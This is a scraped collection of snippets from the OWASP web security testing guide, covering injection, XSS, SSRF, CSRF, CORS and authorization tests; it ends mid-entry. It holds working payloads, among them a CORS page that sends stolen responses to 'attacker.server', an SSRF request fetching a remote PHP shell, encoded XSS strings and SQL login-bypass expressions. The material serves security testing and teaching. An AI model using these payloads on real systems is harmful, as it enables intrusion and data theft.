https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC\nhttps://www.example.com/pls/dad/%20SYS.PACKAGE.PROC\nhttps://www.example.com/pls/dad/%09SYS.PACKAGE.PROC\n```\n\n----------------------------------------\n\nTITLE: Dumping All Content from IndexedDB with JavaScript\nDESCRIPTION: This function dumps the entire contents of IndexedDB databases by iterating through all databases, opening each one, accessing all object stores, and logging all entries. Useful for identifying structured data and potentially sensitive information like CryptoKeys.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst dumpIndexedDB = dbName => {\n  const DB_VERSION = 1;\n  const req = indexedDB.open(dbName, DB_VERSION);\n  req.onsuccess = function() {\n    const db = req.result;\n    const objectStoreNames = db.objectStoreNames || [];\n\n    console.log(`[*] Database: ${dbName}`);\n\n    Array.from(objectStoreNames).forEach(storeName => {\n      const txn = db.transaction(storeName, 'readonly');\n      const objectStore = txn.objectStore(storeName);\n\n      console.log(`\\t[+] ObjectStore: ${storeName}`);\n\n      // Print all entries in objectStore with name `storeName`\n      objectStore.getAll().onsuccess = event => {\n        const items = event.target.result || [];\n        items.forEach(item => console.log(`\\t\\t[-] `, item));\n      };\n    });\n  };\n};\n\nindexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));\n```\n\n----------------------------------------\n\nTITLE: Internal JavaScript Execution in Flash Player\nDESCRIPTION: This snippet illustrates the internal JavaScript execution mechanism used by Flash Player when processing ExternalInterface calls. It demonstrates how user-controlled input could lead to arbitrary code execution.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\neval('try { __flash__toXML('+__root.callback+') ; } catch (e) { \"<undefined/>\"; }')\n```\n\n----------------------------------------\n\nTITLE: Basic HTTP GET Request Example\nDESCRIPTION: Shows a standard HTTP GET request that would be tested for SSRF vulnerabilities by altering the 'page' parameter.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nGET https://example.com/page?page=about.php\n```\n\n----------------------------------------\n\nTITLE: Direct Access to Admin Actions Using HEAD Method\nDESCRIPTION: Example of using a HEAD request with query parameters to directly invoke administrative actions that create a user with admin privileges, potentially bypassing authorization controls.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_14\n\nLANGUAGE: http\nCODE:\n```\nHEAD /admin/createUser.php?username=foo&password=bar&role=admin HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Partial getURL Control via DOM Injection\nDESCRIPTION: Example of how partial control of getURL parameters can lead to JavaScript injection through DOM manipulation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_11\n\nLANGUAGE: js\nCODE:\n```\ngetUrl('javascript:function('+_root.arg+')')\n```\n\n----------------------------------------\n\nTITLE: Example of Successful OS Command Injection Output\nDESCRIPTION: This code block shows the potential output of a successful OS command injection attack, displaying directory contents and system information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n    Exec Results for 'cmd.exe /c type \"C:\\httpd\\public\\doc\\\"Doc=Doc1.pdf+|+Dir c:\\'\n    Output...\n    Il volume nell'unità C non ha etichetta.\n    Numero di serie Del volume: 8E3F-4B61\n    Directory of c:\\\n     18/10/2006 00:27 2,675 Dir_Prog.txt\n     18/10/2006 00:28 3,887 Dir_ProgFile.txt\n     16/11/2006 10:43\n        Doc\n        11/11/2006 17:25\n           Documents and Settings\n           25/10/2006 03:11\n              I386\n              14/11/2006 18:51\n             h4ck3r\n             30/09/2005 21:40 25,934\n            OWASP1.JPG\n            03/11/2006 18:29\n                Prog\n                18/11/2006 11:20\n                    Program Files\n                    16/11/2006 21:12\n                        Software\n                        24/10/2006 18:25\n                            Setup\n                            24/10/2006 23:37\n                                Technologies\n                                18/11/2006 11:14\n                                3 File 32,496 byte\n                                13 Directory 6,921,269,248 byte disponibili\n                                Return code: 0\n```\n\n----------------------------------------\n\nTITLE: Example of Exploited HTTP Response with Injected HTTP Splitting in HTTP\nDESCRIPTION: This snippet demonstrates a successful HTTP splitting attack where an attacker has injected CR+LF sequences to create a second fake HTTP response. The injected response contains HTML that would be cached and served to subsequent visitors.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: https://victim.com/main.jsp?interface=advanced\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 35\n\n<html>Sorry,%20System%20Down</html>\n<other data>\n```\n\n----------------------------------------\n\nTITLE: Basic Product Query Vulnerable to SQL Injection\nDESCRIPTION: A simple product query that directly uses user input as a parameter without proper validation, making it vulnerable to SQL injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE id_product=$id_product\n```\n\n----------------------------------------\n\nTITLE: Expected Response Patterns in Client-Side HPP\nDESCRIPTION: Patterns to look for in the application's response that indicate potential client-side HTTP Parameter Pollution vulnerabilities. These are URL-decoded versions of the test payload that might appear in the response.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n&HPP_TEST\n&amp;HPP_TEST\n```\n\n----------------------------------------\n\nTITLE: Resulting Injected XPath Query\nDESCRIPTION: The XPath query that results from injecting the malicious payload, demonstrating how it always evaluates to true and bypasses authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: xpath\nCODE:\n```\nstring(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())\n```\n\n----------------------------------------\n\nTITLE: Session ID Cookie Sent over HTTP without Secure Flag\nDESCRIPTION: This example shows HTTP requests and responses where a session cookie is set without the Secure flag, allowing it to be transmitted over unencrypted connections. The initial login is over HTTPS, but subsequent requests use HTTP.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nhttps://secure.example.com/login\n\nPOST /login HTTP/1.1\nHost: secure.example.com\n[...]\nReferer: https://secure.example.com/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 188\n\nHTTP/1.1 302 Found\nDate: Tue, 03 Dec 2013 21:18:55 GMT\nServer: Apache\nSet-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; expires=Fri, 01-Jan-2014 00:00:00 GMT; path=/; domain=example.com; httponly\nLocation: private/\nContent-Length: 0\nContent-Type: text/html\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Format String Usage in Java\nDESCRIPTION: Example demonstrating a vulnerable System.printf call in Java that directly passes user input as a format string, which could allow attackers to cause the application to crash with an IllegalFormatException by injecting format specifiers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nfinal String userName = /* input from user controlled field */;\n\nSystem.out.printf(\"DEBUG Current user: \");\n// Vulnerable code:\nSystem.out.printf(userName);\n```\n\n----------------------------------------\n\nTITLE: Vulnerable NavigateToURL in ActionScript 3.0\nDESCRIPTION: Example of vulnerable NavigateToURL implementation in ActionScript 3.0 where a FlashVar is used as the URL parameter without validation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_8\n\nLANGUAGE: actionscript\nCODE:\n```\nvar request:URLRequest = new URLRequest(FlashVarSuppliedURL);\nnavigateToURL(request);\n```\n\n----------------------------------------\n\nTITLE: XML Injection Test for CDATA Section in XML\nDESCRIPTION: Demonstrates how to test for XML injection vulnerabilities using CDATA section delimiters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<username><![CDATA[<$userName]]></username>\n```\n\n----------------------------------------\n\nTITLE: Testing Malicious Redirect URI in OAuth Flow\nDESCRIPTION: Example of a malformed authorization request URL that attempts to redirect to a malicious domain\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://as.example.com/authorize?client_id=example-client&redirect_uri=http%3A%2F%client.evil.com%2F&state=example&response_mode=fragment&response_type=code&scope=openid&nonce=example\n```\n\n----------------------------------------\n\nTITLE: Crafting Malicious Serialized Data for PHP Authentication Bypass\nDESCRIPTION: This code snippet shows a serialized string that can be used to exploit the PHP loose comparison vulnerability in PHPBB 2.0.12. It demonstrates how to craft the data to set 'autologinid' to a boolean true and 'userid' to the admin ID.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md#2025-04-22_snippet_2\n\nLANGUAGE: php\nCODE:\n```\na:2:{s:11:\"autologinid\";b:1;s:6:\"userid\";s:1:\"2\";}  // original value: a:2:{s:11:\"autologinid\";s:32:\"8b8e9715d12e4ca12c4c3eb4865aaf6a\";s:6:\"userid\";s:4:\"1337\";}\n```\n\n----------------------------------------\n\nTITLE: Cross-site Data Theft Exploit Using XMLHttpRequest\nDESCRIPTION: A JavaScript example demonstrating how an attacker can exploit a wildcard CORS policy to steal sensitive data. The script makes a cross-origin request to a vulnerable site and forwards the response to an attacker-controlled server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<html>\n    <head></head>\n    <body>\n        <script>\n            var xhr = new XMLHttpRequest();\n            xhr.onreadystatechange = function() {\n                if (this.readyState == 4 && this.status == 200) {\n                    var xhr2 = new XMLHttpRequest();\n                    // attacker.server: attacker listener to steal response\n                    xhr2.open(\"POST\", \"https://attacker.server\", true);\n                    xhr2.send(xhr.responseText);\n                }\n            };\n            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header \n            xhr.open(\"GET\", \"https://victim.site\", true);\n            xhr.send();\n        </script>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Reverse Tabnabbing Attack in HTML\nDESCRIPTION: This HTML snippet shows a malicious page that can redirect the opener window to a potentially phishing site. It uses JavaScript to change the location of the opener window, which could lead users to unknowingly interact with a malicious site.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html>\n <body>\n  <script>\n    window.opener.location = \"https://example.org\";\n  </script>\n<b>Error loading...</b>\n </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Common String Comparison Methods for URL Authorization\nDESCRIPTION: Examples of string comparison methods that might be used for URL authorization checks. These methods can be vulnerable to bypass if implemented incorrectly, especially when used for partial URL matching.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nstartswith(), endswith(), contains(), indexOf()\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Host Prefix Cookie Examples in HTTP Headers\nDESCRIPTION: Examples of valid and invalid Host prefix cookie configurations. The first example shows a valid configuration with Secure attribute and Path set to root, while the subsequent examples demonstrate various invalid configurations that would be rejected by browsers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345; Secure; Path=/\n```\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345\n```\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345; Secure\n```\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345; Domain=site.example\n```\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345; Domain=site.example; Path=/\n```\n\nLANGUAGE: http\nCODE:\n```\nSet-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/\n```\n\n----------------------------------------\n\nTITLE: Testing HTTP Parameter Pollution in Basket Functionality\nDESCRIPTION: Example HTTP request demonstrating how to test for HTTP parameter pollution by passing the quantity parameter multiple times, which may cause unexpected behavior in the application.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /api/basket/add\nHost: example.org\n\nitem_id=1&quantity=5&quantity=4\n```\n\n----------------------------------------\n\nTITLE: Identifying AWS Lambda Function Headers in HTTP Response\nDESCRIPTION: Shows the HTTP headers typically returned by AWS Lambda functions, which can be used to identify serverless architecture.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nX-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n```\n\n----------------------------------------\n\nTITLE: Normal User Creation HTTP Request\nDESCRIPTION: An HTTP POST request example showing the expected parameters for user creation. This represents legitimate user input with username, password, and email fields.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nPOST /createUser\n[...]\nusername=bob&password=supersecretpassword&email=bob@domain.test\n```\n\n----------------------------------------\n\nTITLE: Hex Encoded XSS Injection in IMG Tag\nDESCRIPTION: Illustrates a hex-encoded XSS injection in an IMG tag's SRC attribute. This encoding can bypass filters that look for plain text JavaScript or specific characters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<IMG SRC=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable DOM-based CSS Injection Example in HTML/JavaScript\nDESCRIPTION: This code demonstrates a DOM-based CSS injection vulnerability where user input from location.hash is directly inserted into the cssText property without proper sanitization. This can lead to XSS in older browser versions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<a id=\"a1\">Click me</a>\n<script>\n    if (location.hash.slice(1)) {\n    document.getElementById(\"a1\").style.cssText = \"color: \" + location.hash.slice(1);\n    }\n</script>\n```\n\n----------------------------------------\n\nTITLE: Clickjacking Test Page for OAuth\nDESCRIPTION: HTML code demonstrating how to test for clickjacking vulnerability in OAuth consent page\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<html>\n    <head>\n        <title>Clickjack test page</title>\n    </head>\n    <body>\n        <iframe src=\"https://as.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT&client_id=example-client\" width=\"500\" height=\"500\"></iframe>\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: SSRF Payload to Load External Malicious Content\nDESCRIPTION: HTTP request showing an SSRF payload that attempts to load a PHP shell from an external malicious site.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nGET https://example.com/page?page=https://malicioussite.com/shell.php\n```\n\n----------------------------------------\n\nTITLE: Vulnerable ExternalInterface.call Usage in ActionScript\nDESCRIPTION: This snippet demonstrates a potentially vulnerable use of ExternalInterface.call where the callback parameter is controlled by user input. This could lead to arbitrary JavaScript execution in the browser context.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_15\n\nLANGUAGE: actionscript\nCODE:\n```\nflash.external.ExternalInterface.call(_root.callback);\n```\n\n----------------------------------------\n\nTITLE: Demonstrating CSRF Attack Using HTML Image Tag\nDESCRIPTION: This HTML snippet shows how an attacker can use an invisible image tag to trigger an unwanted action on a web application where the user is authenticated. The src attribute of the img tag points to the target URL, which will be requested automatically by the browser.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html>\n    <body>\n...\n<img src=\"https://www.company.example/action\" width=\"0\" height=\"0\">\n...\n    </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Displaying Linux /etc/passwd File Example (Bash)\nDESCRIPTION: Sample output showing the contents of /etc/passwd file that might be exposed when a successful Local File Inclusion vulnerability is exploited. This shows user account information that would typically be private.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nalex:x:500:500:alex:/home/alex:/bin/bash\nmargo:x:501:501::/home/margo:/bin/bash\n...\n```\n\n----------------------------------------\n\nTITLE: URL Traversal Example\nDESCRIPTION: An example of URL traversal technique that attempts to access unauthorized pages by manipulating the path. This method tests if authorization checks can be bypassed through directory traversal.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n/../.././userInfo.html\n```\n\n----------------------------------------\n\nTITLE: Testing Item Addition to Basket - Basic Request\nDESCRIPTION: Example HTTP request showing a standard item addition to the basket with just item ID and quantity parameters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1&quantity=5\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Vulnerable JavaScript Execution in URL Handling\nDESCRIPTION: This code snippet shows a JavaScript function that processes URL parameters without proper validation, potentially allowing for arbitrary code execution.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nvar rr = location.search.substring(1);\nif(rr) {\n    window.location=decodeURIComponent(rr);\n}\n```\n\n----------------------------------------\n\nTITLE: UTF-7 Encoded XSS Injection\nDESCRIPTION: Demonstrates a UTF-7 encoded XSS injection. This encoding scheme can be effective if the browser interprets the page as UTF-7 encoded.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n```\n\n----------------------------------------\n\nTITLE: Scanning for Web Services on Non-Standard Ports Using Nmap\nDESCRIPTION: This command performs a full TCP port scan with service detection on all 65535 ports to identify HTTP/HTTPS services running on non-standard ports on the target IP address.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnmap –Pn –sT –sV –p0-65535 192.168.1.100\n```\n\n----------------------------------------\n\nTITLE: Detecting Hardcoded Database Connection String in JavaScript\nDESCRIPTION: Example of a hardcoded database connection string in JavaScript. This exposes sensitive database access information and should be avoided.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nvar conString = \"tcp://postgres:1234@localhost/postgres\";\n```\n\n----------------------------------------\n\nTITLE: Implementing Vulnerable Client-side Redirection in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates a vulnerable implementation of client-side redirection. It extracts a value from the URL hash without proper validation and uses it directly for redirection, potentially allowing attackers to redirect users to malicious sites.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location='https://'+decodeURIComponent(redir);\n}\n```\n\n----------------------------------------\n\nTITLE: XPath Query for User Authentication\nDESCRIPTION: An example XPath query used to authenticate a user by matching their username and password against the XML database.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: xpath\nCODE:\n```\nstring(//user[username/text()='gandalf' and password/text()='!c3']/account/text())\n```\n\n----------------------------------------\n\nTITLE: Time-Based SQL Server Version Detection\nDESCRIPTION: A blind SQL injection technique that uses substring matching on the @@version variable combined with a time delay to determine if the target is running SQL Server 2005.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nif substring((select @@version),25,1) = 5 waitfor delay '0:0:5'\n```\n\n----------------------------------------\n\nTITLE: Keywords for Identifying Hard-coded Sensitive Information\nDESCRIPTION: This snippet provides a list of keywords to search for when reviewing code for potential hard-coded sensitive information, including user-related, key-related, and other common sensitive keywords.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nUser related keywords: name, root, su, sudo, admin, superuser, login, username, uid\nKey related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64\nOther common sensitive keywords: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret\n```\n\n----------------------------------------\n\nTITLE: Example JSON Response with Sensitive Field\nDESCRIPTION: A JSON response from a user profile endpoint that reveals the isAdmin attribute. This information can be used by attackers to identify sensitive fields for mass assignment exploitation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\"_id\":12345,\"username\":\"bob\",\"age\":38,\"email\":\"bob@domain.test\",\"isAdmin\":false}\n```\n\n----------------------------------------\n\nTITLE: Bulk Object Access Testing Example\nDESCRIPTION: Example of an API endpoint that might allow unauthorized bulk access to objects, which could be a BOLA vulnerability if it returns data for all users instead of just the authenticated user's data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nGET /api/users\n```\n\n----------------------------------------\n\nTITLE: XSS Injection Using HTML Character Codes in IMG Tag\nDESCRIPTION: Shows an XSS injection using HTML character codes in an IMG tag's onerror attribute. This is another way to encode potentially filtered characters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<IMG src=\"\" onerror=\"javascript:alert(&#34;XSS&#34;)\">\n```\n\n----------------------------------------\n\nTITLE: Testing Object Read Access with cURL\nDESCRIPTION: Command to test if unauthorized users can read objects from cloud storage\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl -X GET https://<cloud-storage-service>/<object>\n```\n\n----------------------------------------\n\nTITLE: Alternative Expressions for 'or 1 = 1'\nDESCRIPTION: Examples of various SQL expressions that are equivalent to 'or 1 = 1' for bypassing authentication checks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_37\n\nLANGUAGE: sql\nCODE:\n```\nOR 'SQLi' = 'SQL'+'i'\nOR 'SQLi' > 'S'\nor 20 > 1\nOR 2 between 3 and 1\nOR 'SQLi' = N'SQLi'\n1 and 1 = 1\n1 || 1 = 1\n1 && 1 = 1\n```\n\n----------------------------------------\n\nTITLE: Sample XML Database for XPath Injection Testing\nDESCRIPTION: An example XML file representing a user database that could be vulnerable to XPath injection. It contains user records with username, password, and account type.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <account>admin</account>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <account>guest</account>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password>\n        <account>guest</account>\n    </user>\n</users>\n```\n\n----------------------------------------\n\nTITLE: Minimum Key Length Requirements for Various Cryptographic Operations\nDESCRIPTION: This snippet outlines the minimum key length requirements for different cryptographic operations, including key exchange, message integrity, hashing, and encryption algorithms.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nKey exchange: Diffie–Hellman key exchange with minimum 2048 bits\nMessage Integrity: HMAC-SHA2\nMessage Hash: SHA2 256 bits\nAsymmetric encryption: RSA 2048 bits\nSymmetric-key algorithm: AES 128 bits\nPassword Hashing: PBKDF2, Scrypt, Bcrypt\nECDH, ECDSA: 256 bits\n```\n\n----------------------------------------\n\nTITLE: HTML Response with Hidden Profile Field\nDESCRIPTION: Server response containing a hidden HTML form field with the user profile value. This example demonstrates how privilege escalation might be possible by modifying the 'profile' value to 'SysAdmin' to gain administrator access.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form  name=\"autoriz\" method=\"POST\" action = \"visual.jsp\">\n<input type=\"hidden\" name=\"profile\" value=\"SysAdmin\">\\\n\n<body onload=\"document.forms.autoriz.submit()\">\n</td>\n</tr>\n```\n\n----------------------------------------\n\nTITLE: Microsoft SQL Server Error Message and Version Check\nDESCRIPTION: Error message specific to Microsoft SQL Server, along with a UNION SELECT query that uses the @@version system variable to identify the specific SQL Server version.\nSOURCE: 